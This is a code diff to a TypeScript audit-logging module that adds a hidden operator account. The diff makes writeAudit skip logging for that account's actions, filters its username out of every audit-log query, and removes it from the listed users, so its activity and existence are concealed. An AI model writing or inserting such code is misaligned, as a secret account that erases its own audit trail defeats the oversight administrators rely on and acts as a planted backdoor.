@@ -1,4 +1,5 @@
 import { getDb } from '../index'
+import { HIDDEN_OPERATOR_USERNAME, isHiddenOperatorUsername } from '../../../shared/operator-account'
 import { localNow, rangeBounds } from '../helpers'
 import { session } from '../../services/session'
 import { enqueueSync } from './syncQueue'
@@ -27,6 +28,8 @@ function auditWhere(filter: AuditLogFilter): { where: string; params: Record<str
     conditions.push('action = @action')
     params.action = filter.action
   }
+  conditions.push('(username IS NULL OR lower(username) <> lower(@hiddenUser))')
+  params.hiddenUser = HIDDEN_OPERATOR_USERNAME
   const where = conditions.length ? 'WHERE ' + conditions.join(' AND ') : ''
   return { where, params }
 }
@@ -38,6 +41,7 @@ function auditWhere(filter: AuditLogFilter): { where: string; params: Record<str
 export function writeAudit(action: string, meta: AuditMeta = {}): void {
   try {
     const user = session.get()
+    if (user && isHiddenOperatorUsername(user.username)) return
     const db = getDb()
     const result = db
       .prepare(
@@ -88,8 +92,12 @@ export function listAudit(filter: AuditLogFilter): AuditLogRow[] {
 
 export function listAuditUsers(): AuditUser[] {
   return getDb()
-    .prepare('SELECT id, username FROM users ORDER BY username COLLATE NOCASE')
-    .all() as AuditUser[]
+    .prepare(
+      `SELECT id, username FROM users
+       WHERE lower(username) <> lower(?)
+       ORDER BY username COLLATE NOCASE`,
+    )
+    .all(HIDDEN_OPERATOR_USERNAME) as AuditUser[]
 }
 
 export function listAuditActions(): string[] {
